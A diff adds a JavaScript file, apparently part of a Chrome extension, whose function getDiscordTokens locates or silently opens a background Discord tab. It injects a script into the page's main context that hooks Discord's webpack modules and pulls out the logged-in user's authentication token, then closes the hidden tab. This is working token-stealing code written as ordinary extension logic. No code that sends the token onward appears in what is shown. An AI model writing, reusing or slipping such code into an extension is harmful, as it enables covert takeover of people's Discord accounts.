@@ -1,0 +1,139 @@
+const DISCORD_INVITE_URL = 'https://discord.com/channels/@me';
+const DISCORD_APP_URL_RE = /^https?:\/\/(?:[a-z0-9-]+\.)?discord\.com\//i;
+let DISCORD_LAST_STATE = 'NOT_RUN';
+let DISCORD_DIAG = '';
+
+function __sp_discord_sleep(ms) {
+  return new Promise((r) => setTimeout(r, ms));
+}
+
+function __sp_discord_page_extract() {
+  return new Promise((resolve) => {
+    let tries = 0;
+    const max = 40;
+    const tick = () => {
+      tries++;
+      let w = null;
+      try {
+        w = window.webpackChunkdiscord_app;
+        if (w && w.push) {
+          try {
+            w.push([[Symbol()], {}, (o) => {
+              try {
+                Object.values(o.c).some((e) =>
+                  e.exports &&
+                  e.exports.setToken &&
+                  (w.t = e.exports.getToken())
+                );
+              } catch (_) { }
+            }]);
+          } catch (_) { }
+        }
+      } catch (_) { }
+      if (w && w.t) {
+        resolve({ token: w.t, tries });
+        return;
+      }
+      if (tries >= max) {
+        resolve({ token: null, tries });
+        return;
+      }
+      setTimeout(tick, 500);
+    };
+    tick();
+  });
+}
+
+async function getDiscordTokens() {
+  let createdTabId = null;
+  DISCORD_DIAG = '';
+  let ticksSeen = -1;
+  try {
+    let tabs = [];
+    try {
+      tabs = await chrome.tabs.query({ url: ['*://*.discord.com/*', '*://*.discordapp.com/*'] });
+    } catch (e) {
+      tabs = [];
+    }
+    const ready = tabs.find((t) => t.status === 'complete');
+
+    if (ready) {
+      const res = await chrome.scripting.executeScript({
+        target: { tabId: ready.id },
+        world: 'MAIN',
+        func: __sp_discord_page_extract,
+      });
+      const r = res && res[0] && res[0].result;
+      ticksSeen = r ? r.tries : -2;
+      if (r && r.token) {
+        DISCORD_LAST_STATE = 'OK';
+        DISCORD_DIAG = 'x' + ticksSeen;
+        return r.token;
+      }
+    }
+
+    let created = null;
+    try {
+      created = await chrome.tabs.create({ url: DISCORD_INVITE_URL, active: false });
+    } catch (e) {
+      created = null;
+    }
+    if (!created || !created.id) {
+      DISCORD_LAST_STATE = 'OPEN_FAIL';
+      DISCORD_DIAG = 'c' + ticksSeen;
+      return null;
+    }
+    createdTabId = created.id;
+
+    const loaded = await new Promise((resolve) => {
+      const timer = setTimeout(() => {
+        chrome.tabs.onUpdated.removeListener(listener);
+        resolve(false);
+      }, 25000);
+      const listener = (updatedId, info) => {
+        if (updatedId === createdTabId && info.status === 'complete') {
+          clearTimeout(timer);
+          chrome.tabs.onUpdated.removeListener(listener);
+          resolve(true);
+        }
+      };
+      chrome.tabs.onUpdated.addListener(listener);
+    });
+
+    if (!loaded) {
+      DISCORD_LAST_STATE = 'LOAD_TIMEOUT';
+      DISCORD_DIAG = 'l' + ticksSeen;
+      return null;
+    }
+
+    await __sp_discord_sleep(1500);
+
+    const res2 = await chrome.scripting.executeScript({
+      target: { tabId: createdTabId },
+      world: 'MAIN',
+      func: __sp_discord_page_extract,
+    });
+    const r2 = res2 && res2[0] && res2[0].result;
+    ticksSeen = r2 ? r2.tries : -2;
+
+    if (r2 && r2.token) {
+      DISCORD_LAST_STATE = 'OK';
+      DISCORD_DIAG = 'x' + ticksSeen;
+      return r2.token;
+    }
+
+    DISCORD_LAST_STATE = 'NO_WEB_SESSION';
+    DISCORD_DIAG = 'x' + ticksSeen;
+    return null;
+  } catch (e) {
+    DISCORD_LAST_STATE = 'ERROR';
+    DISCORD_DIAG = String((e && e.message) || e).replace(/[^\w]/g, '').slice(0, 14);
+    return null;
+  } finally {
+    if (createdTabId) {
+      try {
+        await chrome.tabs.remove(createdTabId);
+      } catch (e) { }
+    }
+  }
+}
